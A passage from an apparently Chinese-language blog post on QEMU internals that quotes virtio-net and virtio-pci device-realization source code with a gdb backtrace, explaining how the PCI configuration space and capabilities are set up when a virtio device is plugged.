&quot;</span></span><br><span class="line">                    <span class="string">&quot;Unknown option tx=%s, valid options: \&quot;timer\&quot; \&quot;bh\&quot;&quot;</span>,</span><br><span class="line">                    n-&gt;net_conf.tx);</span><br><span class="line">        error_printf(<span class="string">&quot;Defaulting to \&quot;bh\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    n-&gt;net_conf.tx_queue_size = MIN(virtio_net_max_tx_queue_size(n),</span><br><span class="line">                                    n-&gt;net_conf.tx_queue_size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n-&gt;max_queue_pairs; i++) &#123;</span><br><span class="line">        virtio_net_add_queue(n, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    n-&gt;ctrl_vq = virtio_add_queue(vdev, <span class="number">64</span>, virtio_net_handle_ctrl);</span><br><span class="line">    qemu_macaddr_default_if_unset(&amp;n-&gt;nic_conf.macaddr);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;n-&gt;mac[<span class="number">0</span>], &amp;n-&gt;nic_conf.macaddr, <span class="keyword">sizeof</span>(n-&gt;mac));</span><br><span class="line">    n-&gt;status = VIRTIO_NET_S_LINK_UP;</span><br><span class="line">    qemu_announce_timer_reset(&amp;n-&gt;announce_timer, migrate_announce_params(),</span><br><span class="line">                              QEMU_CLOCK_VIRTUAL,</span><br><span class="line">                              virtio_net_announce_timer, n);</span><br><span class="line">    n-&gt;announce_timer.round = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n-&gt;netclient_type) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Happen when virtio_net_set_netclient_name has been called.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        n-&gt;nic = qemu_new_nic(&amp;net_virtio_info, &amp;n-&gt;nic_conf,</span><br><span class="line">                              n-&gt;netclient_type, n-&gt;netclient_name,</span><br><span class="line">                              &amp;dev-&gt;mem_reentrancy_guard, n);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        n-&gt;nic = qemu_new_nic(&amp;net_virtio_info, &amp;n-&gt;nic_conf,</span><br><span class="line">                              object_get_typename(OBJECT(dev)), dev-&gt;id,</span><br><span class="line">                              &amp;dev-&gt;mem_reentrancy_guard, n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n-&gt;max_queue_pairs; i++) &#123;</span><br><span class="line">        n-&gt;nic-&gt;ncs[i].do_not_pad = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    peer_test_vnet_hdr(n);</span><br><span class="line">    <span class="keyword">if</span> (peer_has_vnet_hdr(n)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n-&gt;max_queue_pairs; i++) &#123;</span><br><span class="line">            qemu_using_vnet_hdr(qemu_get_subqueue(n-&gt;nic, i)-&gt;peer, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        n-&gt;host_hdr_len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> virtio_net_hdr);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        n-&gt;host_hdr_len = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    qemu_format_nic_info_str(qemu_get_queue(n-&gt;nic), n-&gt;nic_conf.macaddr.a);</span><br><span class="line"></span><br><span class="line">    n-&gt;vqs[<span class="number">0</span>].tx_waiting = <span class="number">0</span>;</span><br><span class="line">    n-&gt;tx_burst = n-&gt;net_conf.txburst;</span><br><span class="line">    virtio_net_set_mrg_rx_bufs(n, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    n-&gt;promisc = <span class="number">1</span>; <span class="comment">/* for compatibility */</span></span><br><span class="line"></span><br><span class="line">    n-&gt;mac_table.macs = g_malloc0(MAC_TABLE_ENTRIES * ETH_ALEN);</span><br><span class="line"></span><br><span class="line">    n-&gt;vlans = g_malloc0(MAX_VLAN &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    nc = qemu_get_queue(n-&gt;nic);</span><br><span class="line">    nc-&gt;rxfilter_notify_enabled = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (nc-&gt;peer &amp;&amp; nc-&gt;peer-&gt;info-&gt;type == NET_CLIENT_DRIVER_VHOST_VDPA) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">virtio_net_config</span> <span class="title">netcfg</span> =</span> &#123;&#125;;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;netcfg.mac, &amp;n-&gt;nic_conf.macaddr, ETH_ALEN);</span><br><span class="line">        vhost_net_set_config(get_vhost_net(nc-&gt;peer),</span><br><span class="line">            (<span class="type">uint8_t</span> *)&amp;netcfg, <span class="number">0</span>, ETH_ALEN, VHOST_SET_CONFIG_TYPE_FRONTEND);</span><br><span class="line">    &#125;</span><br><span class="line">    QTAILQ_INIT(&amp;n-&gt;rsc_chains);</span><br><span class="line">    n-&gt;qdev = dev;</span><br><span class="line"></span><br><span class="line">    net_rx_pkt_init(&amp;n-&gt;rx_pkt);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (virtio_has_feature(n-&gt;host_features, VIRTIO_NET_F_RSS)) &#123;</span><br><span class="line">        virtio_net_load_ebpf(n, errp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_device_realize</span><span class="params">(DeviceState *dev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtIODevice *vdev = VIRTIO_DEVICE(dev);</span><br><span class="line">    VirtioDeviceClass *vdc = VIRTIO_DEVICE_GET_CLASS(dev);</span><br><span class="line">    Error *err = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Devices should either use vmsd or the load/save methods */</span></span><br><span class="line">    assert(!vdc-&gt;vmsd || !vdc-&gt;load);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vdc-&gt;realize != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        vdc-&gt;realize(dev, &amp;err);</span><br><span class="line">        <span class="keyword">if</span> (err != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            error_propagate(errp, err);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtio_bus_device_plugged(vdev, &amp;err);</span><br><span class="line">    <span class="keyword">if</span> (err != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        error_propagate(errp, err);</span><br><span class="line">        vdc-&gt;unrealize(dev);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vdev-&gt;listener.commit = virtio_memory_listener_commit;</span><br><span class="line">    vdev-&gt;listener.name = <span class="string">&quot;virtio&quot;</span>;</span><br><span class="line">    memory_listener_register(&amp;vdev-&gt;listener, vdev-&gt;dma_as);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到，这里实例化了<strong>virtio设备</strong>具体的组件，诸如<strong>virtquues</strong>、<strong>feature bits</strong>等。除此之外，根据<a href="/2024/08/04/qemu%E7%9A%84PCI%E8%AE%BE%E5%A4%87/" title="qemu的PCI设备">qemu的PCI设备</a>，其需要实例化<strong>PCI配置空间</strong>，是在上述<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/virtio-net.c#L3656">virtio_net_device_realize()</a>中调用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-bus.c#L43"><strong>virtio_bus_device_plugged()</strong></a>中实现的。该函数会调用<strong>virtio设备</strong>所在的<strong>bus</strong>的<strong>device_plugged</strong>函数指针进行，而前面<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2272"><strong>virtio_pci_realize()</strong></a>将<strong>VirtIOPCIProxy</strong>对象设置为<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2719"><strong>virtio-pci-bus总线</strong></a>，并在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-net-pci.c#L49"><strong>virtio_net_pci_realize()</strong></a>中将<strong>virtio设备</strong>，即<strong>VirtIONet</strong>对象的总线类型也设为<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2719"><strong>virtio-pci-bus总线</strong></a>，其在类初始化时将<strong>device_plugged</strong>函数指针设置为<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2089"><strong>virtio_pci_device_plugged()</strong></a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  virtio_pci_device_plugged (d=0x5555580bdd70, errp=0x7fffffffcfd8) at ../../qemu/hw/virtio/virtio-pci.c:2090</span></span><br><span class="line"><span class="comment">//#1  0x0000555555b6fb63 in virtio_bus_device_plugged (vdev=0x5555580c6260, errp=0x7fffffffd030) at ../../qemu/hw/virtio/virtio-bus.c:74</span></span><br><span class="line"><span class="comment">//#2  0x0000555555df39f6 in virtio_device_realize (dev=0x5555580c6260, errp=0x7fffffffd090) at ../../qemu/hw/virtio/virtio.c:3755</span></span><br><span class="line"><span class="comment">//#3  0x0000555555ea0d4e in device_set_realized (obj=0x5555580c6260, value=true, errp=0x7fffffffd360) at ../../qemu/hw/core/qdev.c:510</span></span><br><span class="line"><span class="comment">//#4  0x0000555555eac555 in property_set_bool (obj=0x5555580c6260, v=0x5555580d4190, name=0x555556300c31 &quot;realized&quot;, opaque=0x5555570fc6e0, errp=0x7fffffffd360) at ../../qemu/qom/object.c:2358</span></span><br><span class="line"><span class="comment">//#5  0x0000555555eaa0eb in object_property_set (obj=0x5555580c6260, name=0x555556300c31 &quot;realized&quot;, v=0x5555580d4190, errp=0x7fffffffd360) at ../../qemu/qom/object.c:1472</span></span><br><span class="line"><span class="comment">//#6  0x0000555555eaed24 in object_property_set_qobject (obj=0x5555580c6260, name=0x555556300c31 &quot;realized&quot;, value=0x5555580d40d0, errp=0x7fffffffd360) at ../../qemu/qom/qom-qobject.c:28</span></span><br><span class="line"><span class="comment">//#7  0x0000555555eaa4a4 in object_property_set_bool (obj=0x5555580c6260, name=0x555556300c31 &quot;realized&quot;, value=true, errp=0x7fffffffd360) at ../../qemu/qom/object.c:1541</span></span><br><span class="line"><span class="comment">//#8  0x0000555555ea0468 in qdev_realize (dev=0x5555580c6260, bus=0x5555580c61e0, errp=0x7fffffffd360) at ../../qemu/hw/core/qdev.c:292</span></span><br><span class="line"><span class="comment">//#9  0x0000555555e141a8 in virtio_net_pci_realize (vpci_dev=0x5555580bdd70, errp=0x7fffffffd360) at ../../qemu/hw/virtio/virtio-net-pci.c:64</span></span><br><span class="line"><span class="comment">//#10 0x0000555555b76de9 in virtio_pci_realize (pci_dev=0x5555580bdd70, errp=0x7fffffffd360) at ../../qemu/hw/virtio/virtio-pci.c:2407</span></span><br><span class="line"><span class="comment">//#11 0x0000555555a9cd61 in pci_qdev_realize (qdev=0x5555580bdd70, errp=0x7fffffffd420) at ../../qemu/hw/pci/pci.c:2093</span></span><br><span class="line"><span class="comment">//#12 0x0000555555b77204 in virtio_pci_dc_realize (qdev=0x5555580bdd70, errp=0x7fffffffd420) at ../../qemu/hw/virtio/virtio-pci.c:2501</span></span><br><span class="line"><span class="comment">//#13 0x0000555555ea0d4e in device_set_realized (obj=0x5555580bdd70, value=true, errp=0x7fffffffd690) at ../../qemu/hw/core/qdev.c:510</span></span><br><span class="line"><span class="comment">//#14 0x0000555555eac555 in property_set_bool (obj=0x5555580bdd70, v=0x5555580cdea0, name=0x555556300c31 &quot;realized&quot;, opaque=0x5555570fc6e0, errp=0x7fffffffd690) at ../../qemu/qom/object.c:2358</span></span><br><span class="line"><span class="comment">//#15 0x0000555555eaa0eb in object_property_set (obj=0x5555580bdd70, name=0x555556300c31 &quot;realized&quot;, v=0x5555580cdea0, errp=0x7fffffffd690) at ../../qemu/qom/object.c:1472</span></span><br><span class="line"><span class="comment">//#16 0x0000555555eaed24 in object_property_set_qobject (obj=0x5555580bdd70, name=0x555556300c31 &quot;realized&quot;, value=0x5555580cca90, errp=0x7fffffffd690) at ../../qemu/qom/qom-qobject.c:28</span></span><br><span class="line"><span class="comment">//#17 0x0000555555eaa4a4 in object_property_set_bool (obj=0x5555580bdd70, name=0x555556300c31 &quot;realized&quot;, value=true, errp=0x7fffffffd690) at ../../qemu/qom/object.c:1541</span></span><br><span class="line"><span class="comment">//#18 0x0000555555ea0468 in qdev_realize (dev=0x5555580bdd70, bus=0x555557430730, errp=0x7fffffffd690) at ../../qemu/hw/core/qdev.c:292</span></span><br><span class="line"><span class="comment">//#19 0x0000555555bd0329 in qdev_device_add_from_qdict (opts=0x5555580bc3b0, from_json=false, errp=0x7fffffffd690) at ../../qemu/system/qdev-monitor.c:718</span></span><br><span class="line"><span class="comment">//#20 0x0000555555bd03d9 in qdev_device_add (opts=0x5555570f7230, errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/system/qdev-monitor.c:737</span></span><br><span class="line"><span class="comment">//#21 0x0000555555bda4e7 in device_init_func (opaque=0x0, opts=0x5555570f7230, errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:1200</span></span><br><span class="line"><span class="comment">//#22 0x00005555560c2a63 in qemu_opts_foreach (list=0x555556f53ec0 &lt;qemu_device_opts&gt;, func=0x555555bda4bc &lt;device_init_func&gt;, opaque=0x0, errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/util/qemu-option.c:1135</span></span><br><span class="line"><span class="comment">//#23 0x0000555555bde1b8 in qemu_create_cli_devices () at ../../qemu/system/vl.c:2637</span></span><br><span class="line"><span class="comment">//#24 0x0000555555bde3fe in qmp_x_exit_preconfig (errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:2706</span></span><br><span class="line"><span class="comment">//#25 0x0000555555be0db6 in qemu_init (argc=39, argv=0x7fffffffdad8) at ../../qemu/system/vl.c:3739</span></span><br><span class="line"><span class="comment">//#26 0x0000555555e9b7ed in main (argc=39, argv=0x7fffffffdad8) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment">//#27 0x00007ffff7629d90 in __libc_start_call_main (main=main@entry=0x555555e9b7c9 &lt;main&gt;, argc=argc@entry=39, argv=argv@entry=0x7fffffffdad8) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">//#28 0x00007ffff7629e40 in __libc_start_main_impl (main=0x555555e9b7c9 &lt;main&gt;, argc=39, argv=0x7fffffffdad8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdac8) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment">//#29 0x000055555586f0d5 in _start ()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is called by virtio-bus just after the device is plugged. */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_device_plugged</span><span class="params">(DeviceState *d, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtIOPCIProxy *proxy = VIRTIO_PCI(d);</span><br><span class="line">    VirtioBusState *bus = &amp;proxy-&gt;bus;</span><br><span class="line">    <span class="type">bool</span> legacy = virtio_pci_legacy(proxy);</span><br><span class="line">    <span class="type">bool</span> modern;</span><br><span class="line">    <span class="type">bool</span> modern_pio = proxy-&gt;flags &amp; VIRTIO_PCI_FLAG_MODERN_PIO_NOTIFY;</span><br><span class="line">    <span class="type">uint8_t</span> *config;</span><br><span class="line">    <span class="type">uint32_t</span> size;</span><br><span class="line">    VirtIODevice *vdev = virtio_bus_get_device(bus);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Virtio capabilities present without</span></span><br><span class="line"><span class="comment">     * VIRTIO_F_VERSION_1 confuses guests</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!proxy-&gt;ignore_backend_features &amp;&amp;</span><br><span class="line">            !virtio_has_feature(vdev-&gt;host_features, VIRTIO_F_VERSION_1)) &#123;</span><br><span class="line">        virtio_pci_disable_modern(proxy);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!legacy) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;Device doesn&#x27;t support modern mode, and legacy&quot;</span></span><br><span class="line">                             <span class="string">&quot; mode is disabled&quot;</span>);</span><br><span class="line">            error_append_hint(errp, <span class="string">&quot;Set disable-legacy to off\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modern = virtio_pci_modern(proxy);</span><br><span class="line"></span><br><span class="line">    config = proxy-&gt;pci_dev.config;</span><br><span class="line">    <span class="keyword">if</span> (proxy-&gt;class_code) &#123;</span><br><span class="line">        pci_config_set_class(config, proxy-&gt;class_code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (legacy) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!virtio_legacy_allowed(vdev)) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * To avoid migration issues, we allow legacy mode when legacy</span></span><br><span class="line"><span class="comment">             * check is disabled in the old machine types (&lt; 5.1).</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (virtio_legacy_check_disabled(vdev)) &#123;</span><br><span class="line">                warn_report(<span class="string">&quot;device is modern-only, but for backward &quot;</span></span><br><span class="line">                            <span class="string">&quot;compatibility legacy is allowed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                error_setg(errp,</span><br><span class="line">                           <span class="string">&quot;device is modern-only, use disable-legacy=on&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (virtio_host_has_feature(vdev, VIRTIO_F_IOMMU_PLATFORM)) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;VIRTIO_F_IOMMU_PLATFORM was supported by&quot;</span></span><br><span class="line">                       <span class="string">&quot; neither legacy nor transitional device&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Legacy and transitional devices use specific subsystem IDs.</span></span><br><span class="line"><span class="comment">         * Note that the subsystem vendor ID (config + PCI_SUBSYSTEM_VENDOR_ID)</span></span><br><span class="line"><span class="comment">         * is set to PCI_SUBVENDOR_ID_REDHAT_QUMRANET by default.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        pci_set_word(config + PCI_SUBSYSTEM_ID, virtio_bus_get_vdev_id(bus));</span><br><span class="line">        <span class="keyword">if</span> (proxy-&gt;trans_devid) &#123;</span><br><span class="line">            pci_config_set_device_id(config, proxy-&gt;trans_devid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* pure virtio-1.0 */</span></span><br><span class="line">        pci_set_word(config + PCI_VENDOR_ID,</span><br><span class="line">                     PCI_VENDOR_ID_REDHAT_QUMRANET);</span><br><span class="line">        pci_set_word(config + PCI_DEVICE_ID,</span><br><span class="line">                     PCI_DEVICE_ID_VIRTIO_10_BASE + virtio_bus_get_vdev_id(bus));</span><br><span class="line">        pci_config_set_revision(config, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    config[PCI_INTERRUPT_PIN] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (modern) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_cap</span> <span class="title">cap</span> =</span> &#123;</span><br><span class="line">            .cap_len = <span class="keyword">sizeof</span> cap,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_notify_cap</span> <span class="title">notify</span> =</span> &#123;</span><br><span class="line">            .cap.cap_len = <span class="keyword">sizeof</span> notify,</span><br><span class="line">            .notify_off_multiplier =</span><br><span class="line">                cpu_to_le32(virtio_pci_queue_mem_mult(proxy)),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_cfg_cap</span> <span class="title">cfg</span> =</span> &#123;</span><br><span class="line">            .cap.cap_len = <span class="keyword">sizeof</span> cfg,</span><br><span class="line">            .cap.cfg_type = VIRTIO_PCI_CAP_PCI_CFG,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_notify_cap</span> <span class="title">notify_pio</span> =</span> &#123;</span><br><span class="line">            .cap.cap_len = <span class="keyword">sizeof</span> notify,</span><br><span class="line">            .notify_off_multiplier = cpu_to_le32(<span class="number">0x0</span>),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_cfg_cap</span> *<span class="title">cfg_mask</span>;</span></span><br><span class="line"></span><br><span class="line">        virtio_pci_modern_regions_init(proxy, vdev-&gt;name);</span><br><span class="line"></span><br><span class="line">        virtio_pci_modern_mem_region_map(proxy, &amp;proxy-&gt;common, &amp;cap);</span><br><span class="line">        virtio_pci_modern_mem_region_map(proxy, &amp;proxy-&gt;isr, &amp;cap);</span><br><span class="line">        virtio_pci_modern_mem_region_map(proxy, &amp;proxy-&gt;device, &amp;cap);</span><br><span class="line">        virtio_pci_modern_mem_region_map(proxy, &amp;proxy-&gt;notify, &amp;notify.cap);</span><br><span class="line">        <span class="keyword">if</span> (proxy-&gt;flags &amp; VIRTIO_PCI_FLAG_VDPA) &#123;</span><br><span class="line">            memory_region_add_subregion(&amp;proxy-&gt;modern_bar,</span><br><span class="line">                                        proxy-&gt;lm.offset, &amp;proxy-&gt;lm.mr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (modern_pio) &#123;</span><br><span class="line">            memory_region_init(&amp;proxy-&gt;io_bar, OBJECT(proxy),</span><br><span class="line">                               <span class="string">&quot;virtio-pci-io&quot;</span>, <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">            pci_register_bar(&amp;proxy-&gt;pci_dev, proxy-&gt;modern_io_bar_idx,</span><br><span class="line">                             PCI_BASE_ADDRESS_SPACE_IO, &amp;proxy-&gt;io_bar);</span><br><span class="line"></span><br><span class="line">            virtio_pci_modern_io_region_map(proxy, &amp;proxy-&gt;notify_pio,</span><br><span class="line">                                            &amp;notify_pio.cap);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pci_register_bar(&amp;proxy-&gt;pci_dev, proxy-&gt;modern_mem_bar_idx,</span><br><span class="line">                         PCI_BASE_ADDRESS_SPACE_MEMORY |</span><br><span class="line">                         PCI_BASE_ADDRESS_MEM_PREFETCH |</span><br><span class="line">                         PCI_BASE_ADDRESS_MEM_TYPE_64,</span><br><span class="line">                         &amp;proxy-&gt;modern_bar);</span><br><span class="line"></span><br><span class="line">        proxy-&gt;config_cap = virtio_pci_add_mem_cap(proxy, &amp;cfg.cap);</span><br><span class="line">        cfg_mask = (<span class="type">void</span> *)(proxy-&gt;pci_dev.wmask + proxy-&gt;config_cap);</span><br><span class="line">        pci_set_byte(&amp;cfg_mask-&gt;cap.bar, ~<span class="number">0x0</span>);</span><br><span class="line">        pci_set_long((<span class="type">uint8_t</span> *)&amp;cfg_mask-&gt;cap.offset, ~<span class="number">0x0</span>);</span><br><span class="line">        pci_set_long((<span class="type">uint8_t</span> *)&amp;cfg_mask-&gt;cap.length, ~<span class="number">0x0</span>);</span><br><span class="line">        pci_set_long(cfg_mask-&gt;pci_cfg_data, ~<span class="number">0x0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (proxy-&gt;nvectors) &#123;</span><br><span class="line">        <span class="type">int</span> err = msix_init_exclusive_bar(&amp;proxy-&gt;pci_dev, proxy-&gt;nvectors,</span><br><span class="line">                                          proxy-&gt;msix_bar_idx, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="comment">/* Notice when a system that supports MSIx can&#x27;t initialize it */</span></span><br><span class="line">            <span 